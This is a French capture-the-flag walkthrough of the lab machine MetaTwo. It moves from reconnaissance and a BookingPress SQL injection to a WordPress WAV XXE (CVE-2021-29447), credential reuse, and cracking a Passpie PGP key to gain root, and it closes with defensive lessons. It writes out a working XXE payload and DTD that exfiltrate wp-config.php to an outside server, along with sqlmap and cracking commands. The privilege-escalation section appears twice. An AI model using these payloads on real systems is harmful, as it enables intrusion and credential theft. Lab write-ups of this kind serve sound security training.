![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération et Scanning

Ma phase de reconnaissance débute par un scan **Nmap** complet pour identifier la surface d'attaque.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.186

# Scan détaillé des services identifiés
nmap -p 21,22,80 -sCV 10.10.11.186
```

Le scan révèle trois services :
*   **FTP (21)** : ProFTPD (Debian). L'accès **Anonymous** est désactivé.
*   **SSH (22)** : OpenSSH 8.4p1.
*   **HTTP (80)** : Nginx 1.18.0. Le serveur redirige vers `http://metapress.htb/`.

J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.186 metapress.htb
```

Une recherche de sous-domaines via **wfuzz** ne donne aucun résultat probant, je me concentre donc sur l'application web principale.

---

## 2. Analyse de la Surface Web (metapress.htb)

L'application est propulsée par **WordPress 5.6.2**. En explorant le site, je repère une page `/events/` utilisant le plugin **BookingPress**. 

> **Schéma Mental : Identification du Vecteur**
> WordPress (CMS) -> Plugins tiers -> Recherche de vulnérabilités connues (Exploit-DB/WPSec) -> **BookingPress < 1.0.11** est vulnérable à une **Unauthenticated SQL Injection**.

### Exploitation de la SQL Injection
La vulnérabilité réside dans l'action `bookingpress_front_get_category_services`. Pour l'exploiter, je dois d'abord récupérer un **Nonce** (un jeton de sécurité à usage unique) présent dans le code source de la page `/events/`.

Une fois le **Nonce** en main, j'utilise **SQLmap** pour automatiser l'extraction des données via le paramètre vulnérable `total_service`.

```bash
# Requête capturée (sqli.req) pour SQLmap
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
Content-Type: application/x-www-form-urlencoded

action=bookingpress_front_get_category_services&_wpnonce=<NONCE>&category_id=33&total_service=1

# Extraction des utilisateurs et des hashes
sqlmap -r sqli.req -p total_service --dbms=MySQL -D blog -T wp_users --dump
```

Je récupère deux comptes :
1.  **admin** : `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
2.  **manager** : `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

Le hash du compte **manager** est cassé instantanément avec **Hashcat** et la liste `rockyou.txt` :
`manager : partylikearockstar`

---

## 3. Escalade vers le système via XXE

Le compte **manager** n'a pas les privilèges suffisants pour éditer des thèmes ou installer des plugins. Cependant, la version de **WordPress (5.6.2)** est vulnérable à une **XML External Entity (XXE)** lors de l'upload de fichiers de type **WAV** (**CVE-2021-29447**).

> **Schéma Mental : XXE via Media Upload**
> Upload WAV -> Parsing des métadonnées iXML par PHP -> Définition d'une entité externe -> Lecture de fichiers locaux (LFI) -> Exfiltration via une requête HTTP vers mon serveur.

Je prépare un fichier `payload.wav` malveillant et un fichier `evil.dtd` pour l'exfiltration.

```bash
# Création du payload WAV
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://10.10.14.6/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav

# Contenu de evil.dtd (Lecture du wp-config.php)
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6/?p=%file;'>">
```

En téléversant `payload.wav` dans la bibliothèque multimédia, le serveur traite l'entité XML et m'envoie le contenu de `wp-config.php` encodé en **Base64**.

---

## 4. Premier Shell (Initial Access)

L'analyse du fichier `wp-config.php` révèle des identifiants pour le service **FTP** :
*   **FTP_USER** : `metapress.htb`
*   **FTP_PASS** : `9NYS_ii@FyL_p5M2NvJ`

Je me connecte en **FTP** et découvre un répertoire `/mailer` contenant un script PHP nommé `send_email.php`. Ce script contient des identifiants **SMTP** pour un utilisateur système :

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

Ces identifiants sont valides pour une connexion **SSH**.

```bash
ssh jnelson@metapress.htb
```

Je stabilise mon shell et récupère le flag `user.txt`.

---

### Énumération Interne & Post-Exploitation

Une fois l'accès **SSH** établi en tant que `jnelson`, ma priorité est l'énumération de l'environnement local pour identifier des vecteurs d'escalade de privilèges.

```bash
# Vérification des privilèges sudo
sudo -l

# Énumération des fichiers cachés dans le répertoire personnel
ls -la /home/jnelson
```

L'utilisateur `jnelson` ne possède aucun droit **sudo**. Cependant, la présence d'un répertoire caché nommé `.passpie` attire mon attention. **Passpie** est un gestionnaire de mots de passe en ligne de commande qui stocke les identifiants dans des fichiers chiffrés via **GnuPG**.

### Analyse de Passpie

L'exécution de la commande `passpie` révèle l'existence de deux entrées : une pour `jnelson` et une pour `root`.

```bash
jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

Les mots de passe sont stockés dans `~/.passpie/ssh/root.pass` sous forme de messages **PGP** chiffrés. Pour les lire, je dois posséder la **Passphrase** de la **PGP Private Key** située dans `~/.passpie/.keys`.

> **Schéma Mental : Chaîne de Dépendance Passpie**
> 1. **Fichier .pass** : Contient le mot de passe chiffré (PGP Message).
> 2. **Fichier .keys** : Contient la **PGP Private Key** nécessaire au déchiffrement.
> 3. **Passphrase** : Verrouille la clé privée. Si je cracke la passphrase, je déverrouille la clé, et donc l'accès aux mots de passe en clair.

### Extraction et Cracking de la Clé PGP

Je récupère le fichier `.keys` sur ma machine d'attaque pour tenter un **Brute Force** hors-ligne. Le fichier contient à la fois la clé publique et la clé privée ; je dois isoler la clé privée pour que les outils de cracking fonctionnent correctement.

```bash
# Transfert de la clé vers la machine d'attaque
scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./pgp_keys

# Conversion de la Private Key en format crackable par John The Ripper
# Note : Supprimer le bloc "Public Key" manuellement avant conversion
gpg2john pgp_private_key.asc > gpg.hash

# Attaque par dictionnaire avec RockYou
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

Le hash est cassé instantanément, révélant la passphrase : `blink182`.

### Escalade de Privilèges vers Root

Avec la passphrase de la clé **PGP**, je peux désormais utiliser l'utilitaire `passpie` pour exporter le mot de passe de l'utilisateur `root` en clair.

```bash
# Déchiffrement du mot de passe root via passpie
jnelson@meta2:~$ passpie copy --to stdout --passphrase blink182 root@ssh
p7qfAZt4_A1xo_0x

# Passage en root
jnelson@meta2:~$ su -
Password: p7qfAZt4_A1xo_0x
```

L'utilisation de `su -` avec le mot de passe récupéré permet d'obtenir un shell complet avec les privilèges **root**.

```bash
root@meta2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@meta2:~# cat /root/root.txt
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant que **jnelson**, je débute l'énumération locale pour identifier des vecteurs d'escalade. L'examen du répertoire personnel révèle un dossier caché nommé `.passpie`.

#### 1. Analyse de Passpie
**Passpie** est un gestionnaire de mots de passe en ligne de commande qui utilise **GnuPG** pour chiffrer les informations d'identification dans des fichiers **YAML**.

```bash
# Identification des entrées stockées
passpie
# Exploration de la structure de stockage
ls -la ~/.passpie
cat ~/.passpie/ssh/root.pass
```

Le fichier `root.pass` contient un **PGP Message** chiffré. Pour le déchiffrer, je dois obtenir la **Passphrase** de la **Private Key** située dans `~/.passpie/.keys`.

> **Schéma Mental :**
> L'attaque repose sur une faiblesse de protection de la clé privée. Si la **Passphrase** protégeant la clé PGP est faible, je peux l'extraire, la **Brute Force** hors-ligne, puis utiliser la clé déverrouillée pour lire tous les secrets du coffre-fort (incluant le mot de passe **root**).

#### 2. Extraction et Cracking de la clé PGP
Je récupère le fichier de clés sur ma machine d'attaque pour isoler la clé privée et générer un hash compatible avec les outils de cracking.

```bash
# Extraction du hash de la clé privée (après avoir isolé le bloc PRIVATE)
gpg2john keys > gpg.hash

# Cracking de la passphrase avec John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

Le mot de passe de la clé est identifié : `blink182`.

#### 3. Compromission Totale (Root)
Avec la **Passphrase** en main, je peux solliciter **Passpie** pour exporter le mot de passe de l'utilisateur **root** en clair.

```bash
# Déchiffrement du mot de passe root via passpie
passpie copy --to stdout --passphrase blink182 root@ssh

# Escalade de privilèges
su -
# Password: p7qfAZt4_A1xo_0x
id && cat /root/root.txt
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission de **MetaTwo** met en lumière plusieurs défaillances critiques dans la gestion des secrets et la configuration des services :

1.  **Local Credential Storage Risk** : L'utilisation d'un gestionnaire de mots de passe CLI comme **Passpie** sur une machine partagée est une épée à double tranchant. Bien que les secrets soient chiffrés, la présence de la **Private Key** sur le même système permet à un attaquant ayant compromis un compte utilisateur de tenter un **Offline Brute Force**.
2.  **Weak Passphrase Policy** : La sécurité de l'intégralité du coffre-fort reposait sur une seule **Passphrase** présente dans `rockyou.txt`. Une politique de mots de passe robustes pour les clés de chiffrement est impérative.
3.  **Sensitive Data in Configuration Files** : Le vecteur initial vers **jnelson** a été facilité par la présence de credentials SMTP en clair dans un script PHP (`send_email.php`). Ces informations auraient dû être injectées via des **Environment Variables** ou un **Secret Management System** (type HashiCorp Vault) avec des permissions restrictives.
4.  **Plugin Vulnerability Management** : La chaîne d'attaque a débuté par une **SQL Injection** et une **XXE** dans des composants **WordPress** (BookingPress et Media Manager). Cela souligne l'importance d'un durcissement (Hardening) via des outils comme **Fail2Ban**, l'application systématique des mises à jour de sécurité et l'utilisation de **Web Application Firewalls (WAF)** pour bloquer les payloads XML malveillants.